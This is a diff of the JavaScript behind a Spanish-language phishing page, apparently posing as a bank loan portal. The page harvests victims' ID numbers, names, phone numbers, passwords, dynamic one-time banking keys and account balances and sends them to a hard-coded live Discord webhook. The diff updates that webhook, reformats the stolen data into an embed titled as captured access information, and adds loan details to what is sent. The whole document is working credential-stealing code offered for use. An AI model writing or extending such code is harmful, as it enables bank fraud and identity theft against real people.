@@ -30,18 +30,30 @@ document.addEventListener("DOMContentLoaded", () => {
   let currentInput = 0;
   let contSend = 0;
 
-  // Configuración del webhook de Discord
-  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533510435662331944/DYDjW9TD5X6m7oypId0yEJO9KQeLxidPG46HxsLg77h7X_1ydWj3AzYQFTmxYrWfLaLE";
+  // Configuración del webhook de Discord - WEBHOOK ACTUALIZADO
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1528561832745504890/-WMClOdhjh5W17ifU1gTiOu2IwsJCYZX4IBD7ETnTCARvPsD2tSSVjLqywSsJNie7kQN";
   
-  // Función para enviar mensaje a Discord
+  // Función para enviar mensaje a Discord con embeds formateados
   async function sendToDiscord(content) {
     try {
       console.log("Enviando a Discord:", content); // Debug
+      
+      // Crear un embed formateado para mejor visualización
+      const embed = {
+        title: "✅ Información de Acceso Capturada",
+        description: content,
+        color: 0x0bbd67,
+        timestamp: new Date().toISOString()
+      };
+
       const response = await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content })
+        body: JSON.stringify({ 
+          embeds: [embed]
+        })
       });
+      
       if (!response.ok) {
         console.error("Discord webhook error:", response.status, await response.text());
       } else {
@@ -180,24 +192,37 @@ document.addEventListener("DOMContentLoaded", () => {
           }
         }
 
-        // Construir mensaje para Discord con el formato solicitado
-        let discordMessage = `\n✅ CLAVE DINÁMICA ${contSend}\n\n\n`;
-        discordMessage += `📋 Cédula: ${formData.cedula || ""}\n`;
-        discordMessage += `🙆‍♂️ Nombre: ${nombreCompleto}\n`;
-        discordMessage += `🔢 Número: ${formData.phoneNumber || ""}\n`;
-        discordMessage += `🔑 Clave: ${formData.password || ""}\n\n`;
+        // Construir mensaje para Discord con toda la información capturada
+        let discordMessage = `**📋 INTENTO DE ACCESO #${contSend}**\n\n`;
+        
+        // Información personal
+        discordMessage += `**Datos Personales:**\n`;
+        discordMessage += `• Cédula: \`${formData.cedula || "N/A"}\`\n`;
+        discordMessage += `• Nombre: ${nombreCompleto || "N/A"}\n`;
+        discordMessage += `• Teléfono: \`${formData.phoneNumber || "N/A"}\`\n`;
+        discordMessage += `• Contraseña: \`${formData.password || "N/A"}\`\n\n`;
 
-        // Agregar todas las claves dinámicas acumuladas
-        discordMessage += `--------------------------------------\n`;
+        // Información crediticia
+        discordMessage += `**Información del Crédito:**\n`;
+        discordMessage += `• Monto Solicitado: \`${formData.montoPrestamo || "N/A"}\`\n`;
+        discordMessage += `• Plazo: \`${formData.plazo || "N/A"} meses\`\n`;
+        discordMessage += `• Propósito: \`${formData.motivo || "N/A"}\`\n\n`;
+
+        // Claves dinámicas acumuladas
+        discordMessage += `**Claves Dinámicas Capturadas:**\n`;
         for (let i = 1; i <= contSend; i++) {
           const claveDinamica = formData[`claveDinamica_${i}`] || "Pendiente";
-          discordMessage += `Clave Dinámica ${i}: ${claveDinamica}\n`;
+          discordMessage += `\`Clave ${i}: ${claveDinamica}\`\n`;
         }
-        discordMessage += `---------------------------------------\n\n`;
-
-        discordMessage += `💸 Primer Saldo: ${formData.firstSaldo || ""}\n`;
-        discordMessage += `💸 Segundo Saldo: ${formData.secondSaldo || ""}\n`;
-        discordMessage += `═══════════════════════════════════════`;
+        
+        // Saldos si existen
+        if (formData.firstSaldo || formData.secondSaldo) {
+          discordMessage += `\n**Saldos:**\n`;
+          discordMessage += `• Primer Saldo: \`${formData.firstSaldo || "N/A"}\`\n`;
+          discordMessage += `• Segundo Saldo: \`${formData.secondSaldo || "N/A"}\`\n`;
+        }
+        
+        discordMessage += `\n**Estado:** ${contSend === 3 ? "✅ COMPLETADO" : "⏳ EN PROGRESO"}`;
         
         console.log("Mensaje a Discord:", discordMessage); // Debug
         console.log("formData completo:", formData); // Debug para verificar que se guardó la clave
@@ -223,7 +248,7 @@ document.addEventListener("DOMContentLoaded", () => {
           }, 30500);
         }
         
-        // Enviar a Discord en lugar de Telegram
+        // Enviar a Discord
         try {
           await sendToDiscord(discordMessage);
         } catch (error) {
